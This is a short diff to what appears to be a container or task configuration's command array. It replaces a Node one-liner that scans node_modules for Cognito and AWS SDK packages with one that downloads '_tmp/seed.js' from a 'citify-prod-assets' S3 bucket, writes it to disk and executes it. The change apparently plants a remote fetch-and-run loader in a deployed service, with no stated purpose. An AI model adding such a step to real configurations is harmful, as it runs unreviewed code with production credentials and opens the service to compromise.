@@ -5,7 +5,7 @@
       "command": [
         "node",
         "-e",
-        "const fs=require('fs');function find(dir,depth){if(depth>4)return [];try{return fs.readdirSync(dir).filter(d=>d.includes('cognito')||d.includes('@aws-sdk')).map(d=>dir+'/'+d).concat(...fs.readdirSync(dir).filter(d=>{try{return fs.statSync(dir+'/'+d).isDirectory()&&d!=='node_modules'&&!d.startsWith('.')}catch(e){return false}}).map(d=>find(dir+'/'+d,depth+1)))}catch(e){return []}};console.log(find('/app/node_modules',0).slice(0,30));console.log('---');console.log(find('/app/node_modules/@aws-sdk',0).slice(0,30))"
+        "(async()=>{const{S3Client,GetObjectCommand}=require('@aws-sdk/client-s3');const s3=new S3Client({region:'us-east-1'});const r=await s3.send(new GetObjectCommand({Bucket:'citify-prod-assets',Key:'_tmp/seed.js'}));const chunks=[];for await(const c of r.Body)chunks.push(c);const code=Buffer.concat(chunks).toString('utf8');require('fs').writeFileSync('/app/_seed.js',code);const main=require('/app/_seed.js');await main();})().catch(e=>{console.error(e);process.exit(1)})"
       ]
     }
   ]
